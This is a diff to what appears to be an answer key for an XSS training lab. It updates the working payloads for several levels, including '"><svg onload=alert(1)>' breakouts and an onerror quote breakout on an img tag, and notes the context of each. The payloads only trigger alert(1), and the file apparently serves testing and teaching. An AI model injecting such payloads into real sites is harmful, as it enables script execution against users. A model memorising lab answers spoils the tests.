@@ -25,17 +25,17 @@ Reflections inside attributes of less-common tags (option, meta, button, base, i
 
 ### specialtag-level4
 
-`/specialtag/level4/?query=javascript:alert(1)//`
+`/specialtag/level4/?query=x%22%3E%3Csvg%20onload=alert(1)%3E`
 
-- payload: `javascript:alert(1)//`
-- context: `<base href="...">`; subsequent `<a href="/test">` becomes javascript: URL
+- payload: `x"><svg onload=alert(1)>`
+- context: `<base href="...">`; javascript: base is ignored, so break out
 
 ### specialtag-level5
 
-`/specialtag/level5/?query=%22%20onload=alert(1)%20x=%22`
+`/specialtag/level5/?query=%22%20onerror=alert(1)%20x=%22`
 
-- payload: `" onload=alert(1) x="`
-- context: `<img alt="...">`; angle brackets stripped — quote breakout
+- payload: `" onerror=alert(1) x="`
+- context: `<img alt="...">` on a missing image; angle brackets stripped — quote breakout to onerror
 
 ### specialtag-level6
 
@@ -46,10 +46,10 @@ Reflections inside attributes of less-common tags (option, meta, button, base, i
 
 ### specialtag-level7
 
-`/specialtag/level7/?query=javascript:alert(1)`
+`/specialtag/level7/?query=x%22%3E%3Csvg%20onload=alert(1)%3E`
 
-- payload: `javascript:alert(1)`
-- context: `<object data="...">`; javascript URL
+- payload: `x"><svg onload=alert(1)>`
+- context: `<object data="...">`; Chrome blocks javascript: data, so break out
 
 ### specialtag-level8
 
